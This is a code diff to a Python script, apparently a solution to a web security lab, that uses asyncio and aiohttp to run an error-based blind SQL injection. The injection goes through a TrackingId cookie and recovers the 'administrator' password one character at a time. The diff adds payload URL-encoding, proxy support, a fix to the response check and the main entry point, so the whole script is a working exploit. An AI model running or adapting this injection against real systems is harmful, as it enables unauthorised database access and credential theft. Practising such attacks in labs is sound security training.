@@ -13,17 +13,20 @@ password_extracted = {}
 Get the character for a single position.
 Character is saved in the global variable "password_extracted".
 """
-async def getChar(position, url, session, cookies_in):
+async def getChar(position, url, session, cookies_in, proxy_address):
     # Crack characters 0-9 based on ascii values
     # table (see https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/ASCII-Table-wide.svg/960px-ASCII-Table-wide.svg.png)
-    for j in range(48, 57):
+    for j in range(48, 58):
         cookies = copy.deepcopy(cookies_in)
         sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
-        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload
-        async with session.get(url, cookies=cookies, ssl=False) as r:
+        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
+        async with session.get(url, cookies=cookies, 
+                                ssl=False,
+                                proxy=proxy_address) as r:
             text = await r.text()
-            if "Internal Server Error" in r.text:
-                print("char %s at pos %s\n" % (chr(j), position))
+            if "Internal Server Error" in text:
+                print("char %s at pos %s" % (chr(j), position))
                 password_extracted[position] = chr(j)
                 return
 
@@ -32,11 +35,14 @@ async def getChar(position, url, session, cookies_in):
     for j in range(97, 123):
         cookies = copy.deepcopy(cookies_in)
         sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
-        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload
-        async with session.get(url, cookies=cookies, ssl=False) as r:
+        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
+        async with session.get(url, cookies=cookies, 
+                                ssl=False,
+                                proxy=proxy_address) as r:
             text = await r.text()
-            if "Internal Server Error" in r.text:
-                print("char %s at pos %s\n" % (chr(j), position))
+            if "Internal Server Error" in text:
+                print("char %s at pos %s" % (chr(j), position))
                 password_extracted[position] = chr(j)
                 return
 
@@ -44,16 +50,17 @@ async def getChar(position, url, session, cookies_in):
 Run the tasks to get the individual characters in parallel.
 Using aiohttp as asynchronous http client.
 """
-async def runParallel(url, cookies):
+async def runParallel(url, cookies, proxy_address):
     async with aiohttp.ClientSession() as session:
         rangeNums = list(range(1, 21))
-        tasks = [getChar(i, url, session, cookies) for i in rangeNums]
+        tasks = [getChar(i, url, session, cookies, proxy_address) for i in rangeNums]
         await asyncio.gather(*tasks)
     
     password = "".join(
         password_extracted[i] for i in sorted(password_extracted)
     )
     print("\npassword: %s\n" % password)
+    print(password_extracted)
 
 
 """
@@ -91,3 +98,7 @@ def main():
     }
     print("(+) Settings: \nURL: %s\nCookies: %s\nProxies: %s\n" % (url, cookies, proxies))
     print("(+) Retrieving administrator password...\n")
+    asyncio.run(runParallel(url, cookies, config["http_proxy"]))
+
+if __name__ == "__main__":
+    main()
